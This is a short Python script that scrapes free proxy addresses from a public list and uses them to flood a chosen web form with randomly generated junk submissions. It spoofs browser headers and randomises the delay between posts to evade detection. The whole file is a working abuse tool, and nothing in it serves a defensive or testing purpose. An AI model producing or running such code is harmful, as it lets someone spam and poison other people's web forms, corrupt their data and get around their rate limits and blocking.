import requests
import time
import random
import re

def fetch_proxies():
    """Fetch free proxies from GeoNode."""
    try:
        response = requests.get('https://www.geonode.com/free-proxy-list')
        html = response.text
        proxies = []
        proxy_pattern = re.compile(r'<td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{2,5})</td>')
        matches = proxy_pattern.findall(html)
        for ip, port in matches:
            proxies.append(f"{ip}:{port}")
        return proxies
    except Exception as e:
        print(f"Error fetching proxies: {e}")
        return []

def submit_form(url, data, headers=None, proxies=None):
    """Submit a form with provided data."""
    try:
        if proxies:
            proxy = random.choice(proxies)
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}',
            }
        else:
            proxies = None
        response = requests.post(
            url,
            data=data,
            headers=headers,
            proxies=proxies,
            timeout=10,
        )
        return {
            'status_code': response.status_code,
            'response_length': len(response.text),
            'success': response.status_code == 200,
            'proxy_used': proxies.get('http', 'direct') if proxies else 'direct'
        }
    except Exception as e:
        return {'error': str(e), 'success': False, 'proxy_used': proxies.get('http', 'direct') if proxies else 'direct'}

def flood_junk_data(url, field_names, num_submissions=5, use_proxies=True):
    """Flood the given form with junk data using proxies."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': url,
    }
    proxies = fetch_proxies() if use_proxies else []
    if not proxies and use_proxies:
        print("No proxies available. Falling back to direct connection.")
    for i in range(num_submissions):
        print(f"Submitting form #{i+1}")
        # Generate junk data for each field
        form_fields = {field: f"junk_{random.randint(1000,9999)}" for field in field_names}
        result = submit_form(url, form_fields, headers, proxies)
        if 'error' in result:
            print(f"Error: {result['error']} using {result['proxy_used']}")
        elif result['success']:
            print(f"Success! Response size: {result['response_length']} bytes using {result['proxy_used']}")
        else:
            print(f"Failed with status code: {result['status_code']} using {result['proxy_used']}")
        time.sleep(random.uniform(1, 3))
    print("Automation completed.")